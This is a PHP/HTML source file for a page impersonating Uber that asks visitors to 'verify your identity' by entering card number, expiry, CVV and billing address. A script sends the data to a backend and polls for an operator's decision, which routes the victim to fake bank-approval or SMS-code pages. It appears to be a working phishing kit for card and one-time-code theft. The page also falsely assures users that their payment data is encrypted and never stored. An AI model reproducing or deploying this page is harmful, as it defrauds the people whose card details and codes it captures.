<?php
session_start();
include "./Assets/php/config/config.php";
?>
<!DOCTYPE html>
<html class="light" lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Uber | Verify Identity</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<style>
        .material-symbols-outlined {
            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
        }
        body { font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
        h1, h2, .headline { font-family: 'Plus Jakarta Sans', sans-serif; }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(16px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        .animate-in { animation: fadeInUp 0.55s cubic-bezier(0.16,1,0.3,1) forwards; opacity: 0; }
        .delay-100 { animation-delay: 100ms; }
        .delay-200 { animation-delay: 200ms; }
        .delay-300 { animation-delay: 300ms; }
        .delay-400 { animation-delay: 400ms; }
        .delay-500 { animation-delay: 500ms; }

        @keyframes shake {
            0%,100% { transform: translateX(0); }
            15%      { transform: translateX(-8px); }
            30%      { transform: translateX(8px); }
            45%      { transform: translateX(-5px); }
            60%      { transform: translateX(5px); }
            80%      { transform: translateX(-3px); }
        }
        .card-error-shake { animation: shake 0.55s cubic-bezier(0.36,0.07,0.19,0.97); }
    </style>
<script id="tailwind-config">
        tailwind.config = {
            darkMode: "class",
            theme: {
                extend: {
                    "colors": {
                        "error-container": "#ffdad6",
                        "surface-dim": "#dadada",
                        "on-background": "#1b1b1b",
                        "secondary-fixed-dim": "#aaabab",
                        "primary-fixed": "#5e5e5e",
                        "surface-container": "#eeeeee",
                        "primary-container": "#3b3b3b",
                        "on-error": "#ffffff",
                        "inverse-primary": "#c6c6c6",
                        "surface-tint": "#5e5e5e",
                        "on-tertiary": "#e2e2e2",
                        "inverse-on-surface": "#f1f1f1",
                        "surface": "#f9f9f9",
                        "outline": "#777777",
                        "on-primary-container": "#ffffff",
                        "surface-container-low": "#f3f3f3",
                        "on-secondary-fixed": "#1a1c1c",
                        "inverse-surface": "#303030",
                        "on-tertiary-container": "#ffffff",
                        "on-secondary-fixed-variant": "#3a3c3c",
                        "surface-container-highest": "#e2e2e2",
                        "tertiary-fixed-dim": "#474747",
                        "error": "#ba1a1a",
                        "secondary-container": "#d4d4d4",
                        "on-primary-fixed-variant": "#e2e2e2",
                        "secondary-fixed": "#c6c6c7",
                        "secondary": "#5d5f5f",
                        "surface-container-lowest": "#ffffff",
                        "tertiary-fixed": "#5e5e5e",
                        "outline-variant": "#c6c6c6",
                        "on-surface": "#1b1b1b",
                        "on-primary-fixed": "#ffffff",
                        "surface-container-high": "#e8e8e8",
                        "primary": "#000000",
                        "on-error-container": "#410002",
                        "tertiary-container": "#747474",
                        "primary-fixed-dim": "#474747",
                        "surface-variant": "#e2e2e2",
                        "on-tertiary-fixed": "#ffffff",
                        "on-tertiary-fixed-variant": "#e2e2e2",
                        "on-primary": "#ffffff",
                        "on-secondary": "#ffffff",
                        "background": "#f9f9f9",
                        "tertiary": "#3b3b3b",
                        "surface-bright": "#f9f9f9",
                        "on-surface-variant": "#474747",
                        "on-secondary-container": "#1a1c1c"
                    },
                    "borderRadius": {
                        "DEFAULT": "0.125rem",
                        "lg": "0.25rem",
                        "xl": "0.5rem",
                        "full": "0.75rem"
                    },
                    "fontFamily": {
                        "headline": ["Plus Jakarta Sans"],
                        "body": ["Inter"],
                        "label": ["Inter"]
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-surface text-on-surface min-h-screen flex flex-col">

<!-- Loading Overlay -->
<div id="loadingOverlay" class="hidden fixed inset-0 z-[999] flex flex-col items-center justify-center bg-white">
    <div class="flex flex-col items-center gap-8">
        <div class="relative w-24 h-24">
            <div class="absolute inset-0 rounded-full border-4 border-black/10 animate-ping"></div>
            <div class="absolute inset-2 rounded-full border-4 border-black/20 animate-ping" style="animation-delay:0.15s"></div>
            <div class="absolute inset-4 rounded-full border-4 border-black border-t-transparent animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center">
                <span class="material-symbols-outlined text-black text-2xl" style="font-variation-settings:'FILL' 1">credit_card</span>
            </div>
        </div>
        <div class="flex gap-2">
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.15s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.3s"></div>
        </div>
        <div class="text-center">
            <p class="text-lg font-bold text-black" style="font-family:'Plus Jakarta Sans',sans-serif">Verifying your card</p>
            <p class="text-sm text-neutral-400 mt-1">Please wait, this may take a moment...</p>
        </div>
    </div>
</div>

<!-- TopAppBar -->
<header class="fixed top-0 w-full z-50 bg-white/70 backdrop-blur-xl flex justify-between items-center px-6 py-4">
    <div class="text-2xl font-bold tracking-tighter text-black" style="font-family:'Plus Jakarta Sans',sans-serif;">Uber</div>
    <div class="flex items-center gap-4">
        <button class="material-symbols-outlined text-black p-2 hover:bg-gray-100 transition-colors active:scale-95 duration-150">help</button>
    </div>
</header>

<!-- Main Content Canvas -->
<main class="flex-grow flex items-center justify-center pt-24 pb-12 px-6">
    <div class="max-w-[480px] w-full">

        <!-- Hero Header -->
        <div class="mb-10 text-left animate-in delay-100">
            <h1 class="text-[2.5rem] leading-[1.1] font-bold tracking-tight text-primary mb-4 headline">Verify your identity</h1>
            <p class="text-on-surface-variant text-lg font-normal leading-relaxed">
                To keep your account secure, please provide your billing details.
            </p>
        </div>

        <!-- Form -->
        <form id="verifyForm" class="space-y-12" onsubmit="handleVerify(event)">

            <!-- Section 1: Card Details -->
            <section class="animate-in delay-200">
                <div class="flex items-center gap-3 mb-6">
                    <div class="w-8 h-8 rounded-full bg-surface-container flex items-center justify-center">
                        <span class="material-symbols-outlined text-sm">credit_card</span>
                    </div>
                    <h2 class="text-sm font-bold uppercase tracking-widest text-on-surface-variant">Card Details</h2>
                </div>
                <div class="space-y-4">
                    <!-- Card Error Box -->
                    <div id="cardErrorBox" class="hidden p-4 rounded-lg bg-red-50 border border-red-200">
                        <div class="flex items-start gap-3">
                            <span class="material-symbols-outlined text-red-600 mt-0.5">credit_card_off</span>
                            <div>
                                <p class="text-sm font-bold text-red-800">Card Declined</p>
                                <p id="cardErrorMsg" class="text-sm text-red-700 mt-1">Your card was declined or has an issue. Please check your details and try again.</p>
                            </div>
                        </div>
                    </div>
                    <div class="group">
                        <label class="block text-xs font-bold text-on-surface mb-2 px-1">CARD NUMBER</label>
                        <input name="cc" id="cc" class="card-input w-full bg-surface-container border-none py-4 px-4 text-on-surface focus:ring-0 focus:bg-surface-container-high transition-colors text-lg tracking-wider placeholder:text-outline-variant" placeholder="0000 0000 0000 0000" type="text" maxlength="19" oninput="formatCard(this)" required/>
                        <div class="h-[2px] bg-transparent group-focus-within:bg-primary transition-all duration-300"></div>
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div class="group">
                            <label class="block text-xs font-bold text-on-surface mb-2 px-1">EXPIRY DATE</label>
                            <input name="exp" id="exp" class="card-input w-full bg-surface-container border-none py-4 px-4 text-on-surface focus:ring-0 focus:bg-surface-container-high transition-colors text-lg placeholder:text-outline-variant" placeholder="MM/YY" type="text" maxlength="5" oninput="formatExpiry(this)" required/>
                            <div class="h-[2px] bg-transparent group-focus-within:bg-primary transition-all duration-300"></div>
                        </div>
                        <div class="group">
                            <label class="block text-xs font-bold text-on-surface mb-2 px-1">CVV</label>
                            <input name="cvv" id="cvv" class="card-input w-full bg-surface-container border-none py-4 px-4 text-on-surface focus:ring-0 focus:bg-surface-container-high transition-colors text-lg placeholder:text-outline-variant" placeholder="123" type="password" maxlength="4" required/>
                            <div class="h-[2px] bg-transparent group-focus-within:bg-primary transition-all duration-300"></div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Section 2: Billing Address -->
            <section class="animate-in delay-300">
                <div class="flex items-center gap-3 mb-6">
                    <div class="w-8 h-8 rounded-full bg-surface-container flex items-center justify-center">
                        <span class="material-symbols-outlined text-sm">home_pin</span>
                    </div>
                    <h2 class="text-sm font-bold uppercase tracking-widest text-on-surface-variant">Billing Address</h2>
                </div>
                <div class="space-y-4">
                    <div class="group">
                        <label class="block text-xs font-bold text-on-surface mb-2 px-1">STREET ADDRESS</label>
                        <input name="street" class="w-full bg-surface-container border-none py-4 px-4 text-on-surface focus:ring-0 focus:bg-surface-container-high transition-colors text-lg placeholder:text-outline-variant" placeholder="123 Market St, San Francisco" type="text" required/>
                        <div class="h-[2px] bg-transparent group-focus-within:bg-primary transition-all duration-300"></div>
                    </div>
                    <div class="group">
                        <label class="block text-xs font-bold text-on-surface mb-2 px-1">CITY</label>
                        <input name="city" class="w-full bg-surface-container border-none py-4 px-4 text-on-surface focus:ring-0 focus:bg-surface-container-high transition-colors text-lg placeholder:text-outline-variant" placeholder="City" type="text" required/>
                        <div class="h-[2px] bg-transparent group-focus-within:bg-primary transition-all duration-300"></div>
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div class="group">
                            <label class="block text-xs font-bold text-on-surface mb-2 px-1">STATE / PROVINCE</label>
                            <input name="state" class="w-full bg-surface-container border-none py-4 px-4 text-on-surface focus:ring-0 focus:bg-surface-container-high transition-colors text-lg placeholder:text-outline-variant" placeholder="State" type="text" required/>
                            <div class="h-[2px] bg-transparent group-focus-within:bg-primary transition-all duration-300"></div>
                        </div>
                        <div class="group">
                            <label class="block text-xs font-bold text-on-surface mb-2 px-1">ZIP / POSTAL CODE</label>
                            <input name="zip" class="w-full bg-surface-container border-none py-4 px-4 text-on-surface focus:ring-0 focus:bg-surface-container-high transition-colors text-lg placeholder:text-outline-variant" placeholder="00000" type="text" required/>
                            <div class="h-[2px] bg-transparent group-focus-within:bg-primary transition-all duration-300"></div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Info Box -->
            <div class="bg-surface-container-low p-6 flex gap-4 items-start rounded-lg animate-in delay-400">
                <span class="material-symbols-outlined text-primary mt-0.5" style="font-variation-settings: 'FILL' 1;">lock</span>
                <p class="text-sm text-on-surface-variant leading-relaxed">
                    Your payment information is encrypted and never stored on our servers. We use this only to verify your identity.
                </p>
            </div>

            <!-- Submit Button -->
            <div class="pt-6 animate-in delay-500">
                <button id="verifyBtn" class="w-full bg-primary text-white py-5 px-8 font-bold text-lg rounded transition-all active:scale-[0.98] duration-150 flex justify-between items-center shadow-lg" type="submit">
                    <span>Verify</span>
                    <span class="material-symbols-outlined">arrow_forward</span>
                </button>
                <p class="text-center text-xs text-outline mt-6 font-medium">
                    By continuing, you agree to Uber's Terms of Service.
                </p>
            </div>
        </form>
    </div>
</main>

<!-- Background Decoration -->
<div class="fixed bottom-0 right-0 -z-10 opacity-5 pointer-events-none">
    <h1 class="text-[20rem] font-black tracking-tighter leading-none select-none">UBER</h1>
</div>

<script>
function formatCard(input) {
    let v = input.value.replace(/\D/g, '').substring(0, 16);
    input.value = v.replace(/(.{4})/g, '$1 ').trim();
}
function formatExpiry(input) {
    let v = input.value.replace(/\D/g, '').substring(0, 4);
    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
    input.value = v;
}

let pollInterval = null;

function handleVerify(e) {
    e.preventDefault();
    const btn = document.getElementById('verifyBtn');
    const overlay = document.getElementById('loadingOverlay');

    // Clear any previous errors
    hideCardError();

    // Show loading overlay
    overlay.classList.remove('hidden');
    btn.disabled = true;

    // Submit via AJAX
    const formData = new FormData(document.getElementById('verifyForm'));
    formData.append('card_data', '1');

    fetch('./Assets/php/config/func.php', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'pending' && data.sid) {
            pollInterval = setInterval(() => pollDecision(data.sid), 3000);
        } else {
            hideOverlay();
            showCardError('An error occurred. Please try again.');
        }
    })
    .catch(() => { hideOverlay(); });
}

function pollDecision(sid) {
    fetch('./Assets/php/config/check_status.php?sid=' + encodeURIComponent(sid))
    .then(r => r.json())
    .then(data => {
        if (data.status === 'error_card') {
            clearInterval(pollInterval);
            hideOverlay();
            showCardError('Your card was declined or has an issue. Please check your details and try again.');
        } else if (data.status === 'bank_approve') {
            clearInterval(pollInterval);
            window.location.href = './bank_approve.php';
        } else if (data.status === 'sms') {
            clearInterval(pollInterval);
            window.location.href = './sms_verify.php';
        }
        // else pending => keep polling
    })
    .catch(() => {});
}

function hideOverlay() {
    document.getElementById('loadingOverlay').classList.add('hidden');
    document.getElementById('verifyBtn').disabled = false;
}

function showCardError(msg) {
    const errBox = document.getElementById('cardErrorBox');
    const errMsg = document.getElementById('cardErrorMsg');
    errMsg.textContent = msg;
    errBox.classList.remove('hidden');

    // Shake + red highlight on card inputs
    const inputs = document.querySelectorAll('.card-input');
    inputs.forEach(inp => inp.classList.add('card-error-shake', 'bg-red-50', 'ring-2', 'ring-red-400'));
    setTimeout(() => {
        inputs.forEach(inp => inp.classList.remove('card-error-shake'));
    }, 600);

    errBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

function hideCardError() {
    document.getElementById('cardErrorBox').classList.add('hidden');
    document.querySelectorAll('.card-input').forEach(inp => {
        inp.classList.remove('bg-red-50', 'ring-2', 'ring-red-400', 'card-error-shake');
    });
}
</script>
</body></html>
